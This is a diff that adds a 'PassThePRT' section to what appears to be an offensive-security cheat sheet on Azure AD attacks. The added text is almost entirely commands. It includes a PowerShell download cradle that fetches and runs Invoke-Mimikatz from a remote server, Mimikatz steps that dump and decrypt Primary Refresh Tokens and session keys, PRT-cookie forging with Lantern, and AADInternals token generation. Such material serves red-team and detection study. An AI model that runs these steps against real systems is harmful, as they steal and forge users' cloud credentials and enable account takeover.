@@ -1156,9 +1156,49 @@ a toolkit to exploit Golden SAML can be found [here](https://github.com/securewo
 
 ### PRT Manipulation
 
-
-
 #### PassThePRT
+
+*check AzureAdJoined Status and download Mimikatz:*
+```powershell
+dsregcmd.exe /status
+iex (New-Object Net.Webclient).downloadstring(“https://server/Invoke-Mimikatz.ps1”)
+```
+
+*Looking for **prt** and **KeyValue**:*
+```c
+mimikatz # privilege::debug
+mimikatz # sekurlsa::cloudap
+```
+
+*use **APKD function** to decode **KeyValue** and save **"Context"** and **"DerivedKey"** value:*
+```c
+mimikatz # token::elevate
+mimikatz # dpapi::cloudapkd /keyvalue:$KeyValue /unprotect
+```
+
+```c
+mimikatz # dpapi::cloudapkd /context:$context /derivedkey:$DerivedKey /Prt:$prt
+
+---SNIP---
+Signed JWT : eyJ...
+```
+
+*Forge PRT-Cookie using [lantern](https://github.com/ConstantinT/Lantern):*
+```powershell
+Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
+Lantern.exe cookie --sessionkey <SessionKey> --prt <PRT from Mimikatz>
+```
+
+
+*Generate JWT*
+```powershell
+PS AADInternals> $PRT_OF_USER = '...'
+PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
+PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
+PS AADInternals> $ClearKey = "XXYYZZ..."
+PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
+PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
+```
 
 
 ### MSOL Service Account
